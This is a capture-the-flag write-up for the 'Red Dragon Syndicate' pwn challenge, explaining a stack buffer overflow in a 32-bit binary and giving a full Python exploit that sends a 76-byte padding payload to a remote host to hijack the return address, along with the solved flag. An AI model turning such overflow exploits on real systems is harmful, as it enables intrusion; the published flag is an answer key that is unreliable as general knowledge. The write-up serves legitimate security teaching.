# Red Dragon Syndicate CTF Challenge Writeup

## Challenge Information
- **Name:** Red Dragon Syndicate
- **Points:** 500
- **Category:** Binary Exploitation / Pwn
- **Description:** Vicious runs the Red Dragon Syndicate with an iron fist. His protocol has a classic buffer overflow with an executable stack. You can solve this with ROP or shellcode - choose your weapon wisely.
- **Flag Format:** CS{som3thing_here}
- **Author:** froghunter
- **Remote:** 160.187.130.170:10006
- **Binary:** [Download Link](https://drive.google.com/file/d/14eG5GHJ2YJOJNRXMAa0dMfVdt6z5bSWp/view)

## Solution

**Flag:** `CS{vicious_red_dragon_syndicate_6919506bb161ee2b068f825f}`

## Initial Analysis

### Binary Information
```bash
$ file binary
binary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, 
interpreter /lib/ld-linux.so.2, BuildID[sha1]=4d51db1c280c365c3d64fb80ab894540007e36a0, 
for GNU/Linux 3.2.0, not stripped
```

- **Architecture:** 32-bit x86 (i386)
- **Type:** Dynamically linked, not stripped
- **Stack:** Executable (as mentioned in challenge description)

### Program Flow

The binary presents a menu with three options:
1. Show syndicate intel
2. Accept message
3. Exit

### Vulnerability Analysis

#### Option 1: Show Syndicate Intel
This option leaks several useful addresses:
- `secret_win: 0x80492cc`
- `syndicate_data: 0x804c080`
- `gadget_1: 0x8049296`
- `gadget_2: 0x80492a8`
- `gadget_3: 0x80492ba`

#### Option 2: Accept Message (Vulnerable Function)
The `accept_message()` function contains a classic buffer overflow:

```c
void accept_message() {
    char buffer[72];  // Buffer at -0x48(%ebp)
    // ...
    read(0, buffer, 0x200);  // Reads 512 bytes into 72-byte buffer!
    // ...
}
```

**Disassembly Analysis:**
```asm
08049413 <accept_message>:
 8049413: 55                           	pushl	%ebp
 8049414: 89 e5                        	movl	%esp, %ebp
 8049416: 53                           	pushl	%ebx
 8049417: 83 ec 44                     	subl	$0x44, %esp    ; Allocates 68 bytes
  ...
 8049453: 8d 45 b8                     	leal	-0x48(%ebp), %eax  ; Buffer at ebp-0x48 (72 bytes)
 8049456: 50                           	pushl	%eax
 8049457: 6a 00                        	pushl	$0x0
 8049459: e8 f2 fb ff ff               	calll	0x8049050 <read@plt>
 804945e: 83 c4 10                     	addl	$0x10, %esp
```

**Key Points:**
- Buffer is located at `ebp - 0x48` (72 bytes from base pointer)
- `read()` is called with size `0x200` (512 bytes)
- This allows us to overflow the buffer and overwrite the return address

**Offset Calculation:**
- Buffer starts at: `ebp - 0x48` (72 bytes)
- Saved EBP is at: `ebp` (4 bytes)
- Return address is at: `ebp + 4` (4 bytes)
- **Total offset to return address: 72 + 4 = 76 bytes**

### The `secret_win` Function

The leaked address `secret_win: 0x80492cc` points to a function that prints the flag:

```asm
080492cc <secret_win>:
 80492cc: 55                           	pushl	%ebp
 80492cd: 89 e5                        	movl	%esp, %ebp
 80492cf: 53                           	pushl	%ebx
 80492d0: 83 ec 54                     	subl	$0x54, %esp
  ...
  ; Function prints "RED DRAGON AWAKENED!" and the flag
```

This function directly prints the flag, making it the perfect target for our ROP chain.

## Exploitation Strategy

Since the challenge mentions we can use either ROP or shellcode, and we have a convenient `secret_win` function that prints the flag, we'll use the simpler ROP approach:

1. Overflow the buffer with 76 bytes of padding
2. Overwrite the return address with `secret_win` (0x80492cc)
3. The function will execute and print the flag

## Exploit Code

```python
#!/usr/bin/env python3
"""
Red Dragon Syndicate - ROP Exploit
"""

import socket
import struct
import time
import re

HOST = "160.187.130.170"
PORT = 10006

OFFSET = 76  # Offset to return address
SECRET_WIN = 0x80492cc  # Address of secret_win function

def leak_addresses(s):
    """Leak addresses using option 1"""
    print("[*] Leaking addresses...")
    s.send(b"1\n")
    time.sleep(0.5)
    data = s.recv(4096).decode('utf-8', errors='ignore')
    addresses = re.findall(r'0x[0-9a-fA-F]+', data)
    print(f"[*] Found addresses: {addresses}")
    return addresses

def create_rop_payload():
    """Create ROP payload to call secret_win"""
    payload = b"A" * OFFSET  # Padding to reach return address
    payload += struct.pack("<I", SECRET_WIN)  # Overwrite return address
    return payload

def exploit():
    """Main exploit function"""
    print(f"[*] Connecting to {HOST}:{PORT}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HOST, PORT))
        
        # Receive banner
        data = s.recv(4096)
        print(f"[*] Banner received")
        
        # Leak addresses (optional, but confirms secret_win address)
        addresses = leak_addresses(s)
        
        # Select option 2 (Accept message)
        print("[*] Selecting option 2...")
        s.send(b"2\n")
        time.sleep(0.5)
        
        # Receive prompt
        data = s.recv(4096)
        
        # Send ROP payload
        payload = create_rop_payload()
        print(f"[*] Sending ROP payload ({len(payload)} bytes)...")
        s.send(payload)
        
        # Receive response with flag
        time.sleep(1)
        data = s.recv(4096)
        response = data.decode('utf-8', errors='ignore')
        print(f"[*] Response:\n{response}")
        
        # Extract flag
        if "CS{" in response:
            flag_match = re.search(r'CS\{[^}]+\}', response)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n[+] FLAG FOUND: {flag}\n")
        
        s.close()
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    exploit()
```

## Exploitation Steps

1. **Connect to the remote server:**
   ```bash
   $ python3 exploit_rop.py
   ```

2. **Leak addresses (Option 1):**
   - Confirms the `secret_win` address: `0x80492cc`

3. **Trigger buffer overflow (Option 2):**
   - Send 76 bytes of padding ('A' characters)
   - Overwrite return address with `0x80492cc` (secret_win)

4. **Receive flag:**
   - The `secret_win` function executes
   - Prints "🐉 RED DRAGON AWAKENED!"
   - Prints the flag: `CS{vicious_red_dragon_syndicate_6919506bb161ee2b068f825f}`

## Alternative Approach: Shellcode

Although we used ROP in this solution, the challenge mentions the stack is executable, so we could also use shellcode:

1. Place shellcode in the buffer (with NOP sled)
2. Calculate the buffer address (would need to leak stack address)
3. Overwrite return address to jump to shellcode
4. Execute `/bin/sh` to get a shell

However, the ROP approach is simpler and more reliable since `secret_win` directly gives us the flag.

## Key Takeaways

1. **Buffer Overflow:** Classic stack-based buffer overflow in the `accept_message()` function
2. **Information Leakage:** Option 1 leaks useful addresses including `secret_win`
3. **ROP vs Shellcode:** ROP was simpler here due to the convenient `secret_win` function
4. **Offset Calculation:** Critical to calculate the correct offset (76 bytes) to overwrite the return address
5. **32-bit Binary:** Remember to use little-endian format when packing addresses

## Files

- `binary` - The vulnerable binary
- `exploit_rop.py` - ROP-based exploit (used for solution)
- `exploit.py` - Shellcode-based exploit (alternative approach)

## Flag

```
CS{vicious_red_dragon_syndicate_6919506bb161ee2b068f825f}
```

